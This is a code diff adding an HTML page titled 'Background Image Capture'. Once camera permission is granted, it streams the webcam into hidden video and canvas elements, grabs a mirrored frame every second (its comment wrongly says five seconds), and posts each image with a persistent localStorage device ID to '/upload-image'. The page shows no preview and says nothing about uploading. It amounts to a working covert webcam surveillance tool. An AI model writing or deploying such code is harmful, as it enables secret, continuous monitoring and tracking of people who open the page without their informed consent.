@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Background Image Capture</title>
+</head>
+<body>
+    <h1>Image Capture Running in the Background</h1>
+    <video id="video" autoplay style="display:none;"></video> <!-- Hidden video element -->
+    <canvas id="canvas" style="display: none;"></canvas> <!-- Hidden canvas element for capturing image -->
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+
+           // Generate or retrieve device ID from local storage
+           let deviceId = localStorage.getItem('deviceId');
+        if (!deviceId) {
+            deviceId = 'device_' + Date.now(); // Generate a unique device ID
+            localStorage.setItem('deviceId', deviceId);
+        }
+
+
+        // Request access to the user's webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Function to capture an image and send it to the server
+                function captureImage() {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // Flip the image horizontally (mirror it)
+                    context.save();  // Save the current state
+                    context.scale(-1, 1);  // Flip horizontally
+                    context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);  // Adjust drawing
+                    context.restore();  // Restore the original state
+
+                    // Get the image data as base64
+                    const imageData = canvas.toDataURL('image/png');
+
+                   
+                    // Send the image to the server with the device ID
+                    fetch('/upload-image', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            deviceId: deviceId,
+                            image: imageData
+                        })
+                    }).then(response => {
+                        return response.text();
+                    }).then(data => {
+                        console.log('Image uploaded:', data);
+                    }).catch(err => {
+                        console.error('Error uploading image:', err);
+                    });
+                }
+
+                // Automatically capture an image every 5 seconds (5000 ms)
+                setInterval(captureImage, 1000);
+            })
+            .catch(err => {
+                console.error('Error accessing webcam:', err);
+            });
+    </script>
+</body>
+</html>
